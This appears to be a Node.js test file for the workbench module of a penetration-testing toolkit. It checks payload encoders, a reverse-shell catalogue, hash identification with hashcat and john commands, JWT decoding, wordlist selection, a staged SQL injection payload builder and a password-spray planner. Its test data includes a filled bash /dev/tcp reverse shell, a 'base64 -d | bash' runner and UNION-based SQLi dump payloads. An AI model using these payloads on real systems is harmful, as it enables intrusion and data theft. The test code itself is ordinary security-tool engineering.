/* Workbench engine (OBOL.workbench): encoders and the reverse-shell catalogue. Locks the byte-exact
 * base64 (round-trips), the PowerShell -EncodedCommand (UTF-16LE then base64), template filling, and
 * that every catalogue entry is well formed. Pure, generic data. */
'use strict';
require('../../assets/engine/workbench.js');
const OBOL = globalThis.OBOL, W = OBOL.workbench;

let fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// base64 against node's own Buffer (ground truth)
['', 'a', 'ab', 'abc', 'hello world', 'id;whoami', '() { :;}; echo vulnerable', 'café ☕'].forEach(function (s) {
  ok(W.b64(s) === Buffer.from(s, 'utf8').toString('base64'), 'b64 matches node Buffer for ' + JSON.stringify(s));
});
// base64 round-trips through our own decoder
['', 'abc', 'hello world', 'café ☕', 'id;whoami'].forEach(function (s) {
  ok(W.b64decode(W.b64(s)) === s, 'b64 round-trips ' + JSON.stringify(s));
});

// PowerShell -EncodedCommand: base64 of UTF-16LE bytes, byte-identical to node's own encoding
const ps = 'whoami';
ok(W.psEnc(ps) === Buffer.from(ps, 'utf16le').toString('base64'), 'psEnc matches node utf16le base64');
ok(W.psEnc(ps) === 'dwBoAG8AYQBtAGkA', 'psEnc(whoami) is the known value');

// other encoders
ok(W.hexEnc('AB') === '4142', 'hexEnc AB -> 4142');
ok(W.rot13('abcABC') === 'nopNOP', 'rot13 basic');
ok(W.rot13(W.rot13('Hello, World!')) === 'Hello, World!', 'rot13 is its own inverse');
ok(W.urlEncAll('a b') === '%61%20%62', 'urlEncAll encodes every byte');
ok(W.ifsEvade('cat /etc/passwd') === 'cat${IFS}/etc/passwd', 'ifsEvade swaps spaces');

// template filling
const bash = W.revShell('bash-i');
ok(bash && /bash -i/.test(bash.tpl), 'bash-i entry exists');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2', lport: '4444' }) === 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', 'fill substitutes lhost/lport');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2' }).indexOf('{{lport}}') >= 0, 'missing value stays a visible token');

// linux base64 runner wraps and decodes back to the original
const cmd = W.fill(bash.tpl, { lhost: '10.0.0.1', lport: '9001' });
const runner = W.linuxB64Runner(cmd);
ok(/\| base64 -d \| bash$/.test(runner), 'linuxB64Runner pipes to base64 -d | bash');
ok(W.b64decode(runner.split(' ')[1]) === cmd, 'the runner payload decodes back to the command');

// catalogue integrity
ok(W.REVSHELLS.length >= 12, 'catalogue has the common set (' + W.REVSHELLS.length + ')');
const ids = {};
W.REVSHELLS.forEach(function (e) {
  ok(e.id && e.name && e.tpl && e.note, 'entry ' + e.id + ' is well formed');
  ok(!ids[e.id], 'id ' + e.id + ' is unique'); ids[e.id] = 1;
  ok(['linux', 'windows'].indexOf(e.os) >= 0, 'entry ' + e.id + ' has a known os');
});
ok(W.revShell('ps-tcp').enc.indexOf('psenc') >= 0, 'the PowerShell TCP shell offers -EncodedCommand');

// ── hash identifier ──────────────────────────────────────────────────────────────────────────
function topName(h) { return (W.identifyHash(h).candidates[0] || {}).name || ''; }
function topMode(h) { return (W.identifyHash(h).candidates[0] || {}).mode; }

ok(/bcrypt/.test(topName('$2b$12$' + 'a'.repeat(53))), 'bcrypt recognised by prefix');
ok(topMode('$2b$12$' + 'a'.repeat(53)) === 3200, 'bcrypt is mode 3200');
ok(/sha512crypt/.test(topName('$6$abc$def')), 'sha512crypt ($6$) recognised');
ok(topMode('$6$abc$def') === 1800, 'sha512crypt is mode 1800');
ok(/md5crypt/.test(topName('$1$abc$def')), 'md5crypt ($1$) recognised');
ok(/phpass/i.test(topName('$P$Babcdefghijklmnop')), 'phpass ($P$) recognised');
ok(topMode('$krb5tgs$23$*svc*' ) === 13100, 'Kerberoast RC4 is mode 13100');
ok(topMode('$krb5asrep$23$user@DOM') === 18200, 'AS-REP RC4 is mode 18200');
ok(topMode('$krb5tgs$18$*svc*') === 19700, 'Kerberoast AES256 is mode 19700');

// bare hex: NTLM/MD5 ambiguity for 32 hex, NTLM ranked first with MD5 offered
const h32 = W.identifyHash('b4b9b02e6f09a9bd760f388b67351e2b');
ok(h32.candidates.length >= 2 && /NTLM/.test(h32.candidates[0].name), '32-hex ranks NTLM first');
ok(h32.candidates.some(function (c) { return /MD5/.test(c.name) && c.mode === 0; }), '32-hex also offers MD5 (mode 0)');
ok(topMode('a'.repeat(40)) === 100, '40-hex is SHA-1 (mode 100)');
ok(topMode('a'.repeat(64)) === 1400, '64-hex is SHA-256 (mode 1400)');
ok(topMode('a'.repeat(128)) === 1700, '128-hex is SHA-512 (mode 1700)');

// NetNTLMv2 capture
ok(topMode('user::DOMAIN:1122334455667788:' + 'a'.repeat(32) + ':' + 'b'.repeat(40)) === 5600, 'NetNTLMv2 capture is mode 5600');

// pwdump line: identify the NT hash, flag the LM only when set
const pw = W.identifyHash('Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::');
ok(/NTLM/.test(pw.candidates[0].name) && pw.candidates.length === 1, 'pwdump with empty LM yields NT only');
const pw2 = W.identifyHash('bob:1001:' + 'a'.repeat(32) + ':' + 'b'.repeat(32) + ':::');
ok(pw2.candidates.some(function (c) { return /^LM/.test(c.name); }), 'pwdump with a set LM flags the LM too');

// crack command builders
ok(W.hashcatCmd(1000) === 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt', 'hashcat command forms');
ok(W.hashcatCmd(null) === null, 'no hashcat command for a null mode');
ok(/john --format=nt /.test(W.johnCmd('nt')), 'john command forms');

// unknown input is handled gracefully
ok(W.identifyHash('not a hash at all').candidates.length === 0, 'non-hash yields no candidates (with a note)');
ok(W.identifyHash('').candidates.length === 0, 'empty input is safe');

// ── encoder round-trips + JWT ────────────────────────────────────────────────────────────────
ok(W.hexDecode(W.hexEnc('Hello /etc/passwd')) === 'Hello /etc/passwd', 'hex round-trips');
ok(W.hexDecode('zz') === null, 'hexDecode rejects non-hex');
ok(W.hexDecode('abc') === null, 'hexDecode rejects odd length');
ok(W.urlDecode(W.urlEnc('a b&c=d')) === 'a b&c=d', 'url round-trips');
ok(W.urlDecode('%ZZ') === null, 'urlDecode handles bad input safely');

// JWT: decode a real HS256 token (header {alg:HS256,typ:JWT}, payload {user:admin})
const jwt = Buffer.from('{"alg":"HS256","typ":"JWT"}').toString('base64url') + '.'
  + Buffer.from('{"user":"admin","role":"guest"}').toString('base64url') + '.sIgNaTuRe';
const dj = W.decodeJwt(jwt);
ok(dj.ok && dj.header.alg === 'HS256', 'JWT header decodes');
ok(dj.payload.user === 'admin' && dj.payload.role === 'guest', 'JWT payload decodes');
ok(dj.flags.some(function (f) { return /HMAC/.test(f); }), 'HS256 raises the weak-secret flag');
const none = Buffer.from('{"alg":"none"}').toString('base64url') + '.' + Buffer.from('{"u":1}').toString('base64url') + '.';
ok(W.decodeJwt(none).flags.some(function (f) { return /none/.test(f); }), 'alg:none raises its flag');
ok(W.decodeJwt('not.a.jwt').ok === false, 'garbage JWT reports not ok');
ok(W.decodeJwt('onlyonepart').ok === false, 'a token without dots is rejected');

// ── wordlist picker ──────────────────────────────────────────────────────────────────────────
ok(W.WORDLISTS.length >= 15, 'wordlist catalogue is populated (' + W.WORDLISTS.length + ')');
W.WORDLISTS.forEach(function (w) { ok(w.task && w.name && w.path && w.note && Array.isArray(w.tags), 'wordlist ' + w.name + ' is well formed'); });
const dirs = W.pickWordlists('dirs', []);
ok(dirs.length >= 3 && dirs[0].name === 'raft-medium-directories', 'dirs default ranks raft-medium first');
const dirsIis = W.pickWordlists('dirs', ['iis']);
ok(dirsIis[0].tags.indexOf('iis') >= 0 && dirsIis[0].matched === true, 'an IIS stack floats the IIS list to the top');
ok(W.pickWordlists('passwords', [])[0].name === 'rockyou.txt', 'passwords default is rockyou');
ok(/gobuster dir -u http:\/\/10\.10\.10\.5\//.test(W.wordlistCmd('dirs', '/wl.txt', '10.10.10.5')), 'dirs sample command fills the target');
ok(W.wordlistCmd('dirs', '/wl.txt').indexOf('<target>') >= 0, 'sample command shows <target> when none is set');
ok(/-x php/.test(W.wordlistCmd('dirs', '/wl.txt', 't', 'php')), 'an extension is threaded into the dirs command');

// ── manual SQLi builder ──────────────────────────────────────────────────────────────────────
ok(W.sqliDbmsList().length >= 4, 'SQLi covers the common engines (' + W.sqliDbmsList().length + ')');
function phase(state, key) { return W.sqliBuild(state).phases.filter(function (p) { return p.key === key; })[0]; }
function payloads(state, key) { var p = phase(state, key); return p ? p.items.map(function (i) { return i.payload; }) : []; }

// string context starts every payload with a quote; numeric does not
ok(payloads({ dbms: 'mysql', ctx: 'string' }, 'detect')[1] === "' OR 1=1-- -", 'MySQL string true payload');
ok(payloads({ dbms: 'mysql', ctx: 'numeric' }, 'detect')[1] === ' OR 1=1-- -', 'numeric context drops the quote');
ok(payloads({ dbms: 'mssql', ctx: 'string' }, 'detect')[1] === "' OR 1=1-- ", 'MSSQL uses the -- comment');

// progressive disclosure: no UNION-visible phase until cols is set
ok(!phase({ dbms: 'mysql', ctx: 'string' }, 'vis'), 'no visible-column phase before column count');
ok(phase({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'vis'), 'visible-column phase appears once cols is set');
ok(payloads({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'vis')[0] === "' UNION SELECT 1,2,3-- -", 'UNION lists all columns');

// info phase places the expression at the visible column only
const info = payloads({ dbms: 'mysql', ctx: 'string', cols: 3, vis: 2 }, 'info')[0];
ok(info === "' UNION SELECT 1,@@version,3-- -", 'version goes in the visible column, others stay numbered');
ok(!phase({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'info'), 'no info phase until a visible column is chosen');

// tables phase pulls names; columns/dump only after a table is chosen
ok(/information_schema\.tables WHERE table_schema=database\(\)/.test(payloads({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1 }, 'tables')[0]), 'MySQL tables query targets the current database');
ok(!phase({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1 }, 'columns'), 'no columns phase without a table');
ok(phase({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1, table: 'users' }, 'dump'), 'dump phase appears with a table');
ok(/group_concat/.test(payloads({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1, table: 'users' }, 'dump')[0]), 'MySQL dump uses group_concat');

// postgres / sqlite specifics
ok(/pg_sleep/.test(payloads({ dbms: 'postgres', ctx: 'string' }, 'detect').join(' ')), 'PostgreSQL offers pg_sleep time-based');
ok(/sqlite_master/.test(payloads({ dbms: 'sqlite', ctx: 'string', cols: 2, vis: 1 }, 'tables')[0]), 'SQLite lists from sqlite_master');
ok(W.SQLI_DBMS.sqlite.time === null, 'SQLite has no time-based payload (correctly omitted)');

// ── explain this output (annotate) ───────────────────────────────────────────────────────────
ok(/open/.test(W.explainKind('port:445').proves), 'port kind explains "open"');
ok(/pass-the-hash/i.test(W.explainKind('hash.ntlm').caveat), 'NTLM caveat mentions pass-the-hash');
ok(W.explainKind('service.smb').proves.length > 0, 'prefix match resolves service.*');
ok(W.explainKind('some.unknown.kind').caveat.length > 0, 'unknown kind has a fallback caveat');

// needles pull distinctive values, and skip booleans
const nd = W.factNeedles({ kind: 'port:445', value: { port: 445, service: 'microsoft-ds', open: true } });
ok(nd.indexOf('445') >= 0 && nd.indexOf('microsoft-ds') >= 0, 'needles include the port and service');
ok(nd.indexOf('true') < 0, 'needles skip booleans');

// annotate maps facts onto the lines that contain their values
const sample = 'PORT   STATE SERVICE\n445/tcp open  microsoft-ds\n80/tcp open  http';
const facts = [
  { kind: 'port:445', value: { port: 445, service: 'microsoft-ds' } },
  { kind: 'port:80', value: { port: 80, service: 'http' } },
];
const ann = W.annotateOutput(sample, facts);
ok(ann.lines.length === 3, 'annotate keeps every line');
ok(ann.facts[0].lineNos.indexOf(1) >= 0, 'the 445 fact maps to the 445 line');
ok(ann.lines[1].factIdxs.length >= 1, 'the 445 line is marked as a hit');
ok(ann.lines[0].factIdxs.length === 0, 'the header line is not a false hit');

// ── lockout-aware spray planner ──────────────────────────────────────────────────────────────
const sp = W.sprayPlan({ threshold: 5, windowMin: 30, passwords: 12, margin: 1 });
ok(sp.ok && sp.safePerWindow === 4, 'threshold 5 margin 1 -> 4 safe attempts per window');
ok(sp.rounds === 3, '12 passwords at 4 per window -> 3 rounds');
ok(sp.totalMinutes === 60, '3 rounds, wait between -> 60 minutes');
ok(W.sprayPlan({ threshold: 0 }).noLockout === true, 'threshold 0 means no lockout');
ok(W.sprayPlan({ threshold: 1, windowMin: 30, passwords: 5, margin: 1 }).ok === false, 'threshold 1 with margin 1 leaves no safe attempts');
ok(W.sprayPlan({ threshold: 3, windowMin: 15, passwords: 2, margin: 1 }).safePerWindow === 2, 'threshold 3 margin 1 -> 2 per window');
ok(W.sprayPlan({ windowMin: 30, passwords: 5 }).ok === false, 'missing threshold is rejected');
ok(W.sprayPlan({ threshold: 5, passwords: 5 }).ok === false, 'missing window is rejected');
ok(W.sprayPlan({ threshold: 2, windowMin: 30, passwords: 10, margin: 1 }).warnings.some(function (w) { return /one attempt per window/i.test(w); }), 'one-per-window warns');
ok(W.fmtDuration(90) === '1h 30m', 'fmtDuration 90 -> 1h 30m');
ok(W.fmtDuration(45) === '45m', 'fmtDuration 45 -> 45m');

console.log(fail ? ('\nWORKBENCH: ' + fail + ' FAILURES') : '\nWORKBENCH: all passed');
process.exit(fail ? 1 : 0);
